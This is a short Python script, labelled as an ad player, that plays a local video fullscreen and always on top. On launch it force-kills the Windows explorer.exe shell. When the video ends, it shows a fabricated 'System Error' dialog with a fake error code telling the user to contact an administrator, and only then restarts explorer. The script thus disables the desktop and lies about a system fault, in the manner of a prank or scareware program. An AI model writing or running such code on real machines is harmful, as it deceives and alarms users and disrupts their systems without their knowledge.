import sys
import subprocess
import tkinter as tk
from tkinter import messagebox
from PyQt5.QtCore import Qt, QUrl
from PyQt5.QtMultimediaWidgets import QVideoWidget
from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QMessageBox


def on_closing():
    print("Hello World")
    subprocess.Popen("start explorer", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit()


class VideoPlayer(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("广告播放器")
        self.setGeometry(100, 100, 800, 600)  # 设置窗口初始位置和大小

        self.central_widget = QWidget(self)
        self.setCentralWidget(self.central_widget)

        self.layout = QVBoxLayout(self.central_widget)

        self.mediaPlayer = QMediaPlayer(None, QMediaPlayer.VideoSurface)
        self.videoWidget = QVideoWidget()

        self.layout.addWidget(self.videoWidget)

        self.mediaPlayer.setVideoOutput(self.videoWidget)

        self.open_file()  # 直接调用打开文件方法，程序启动时自动播放视频

        self.mediaPlayer.stateChanged.connect(self.mediaStateChanged)
        self.mediaPlayer.error.connect(self.handleError)

        # 设置窗口真正全屏，无边框和标题栏，并置顶
        self.setWindowState(Qt.WindowFullScreen)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)

        # 去除窗口四周的小白边
        self.layout.setContentsMargins(0, 0, 0, 0)
        self.central_widget.setLayout(self.layout)

        # 创建全局的root对象
        self.root = tk.Tk()
        self.root.withdraw()  # 隐藏主窗口

    def open_file(self):
        # 默认视频路径为脚本同目录下的 Video.mp4
        video_path = './Video.mp4'
        media = QMediaContent(QUrl.fromLocalFile(video_path))
        self.mediaPlayer.setMedia(media)
        self.mediaPlayer.play()

    def mediaStateChanged(self, state):
        if state == 0:
            # 当视频播放结束时，显示最后一帧
            self.showEndMessage()

    def showEndMessage(self):
        self.root.attributes('-topmost', True)  # 确保提示窗口显示在最顶层
        result = messagebox.showerror("System Error","An unknown error occurred in the Windows New system.\nError code : 0x6604606446\nPlease contact your system developer or administrator.")
        if result == 'ok':
            on_closing()

    def handleError(self):
        QMessageBox.warning(self, "错误","媒体文件已损坏或媒体文件不存在，无法播放，请确保已在程序同目录下放置名为Video.mp4且没有损坏的媒体文件！",QMessageBox.Ok)
        subprocess.Popen("start explorer", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = VideoPlayer()
    window.show()
    subprocess.Popen("taskkill /f /im explorer.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit(app.exec_())
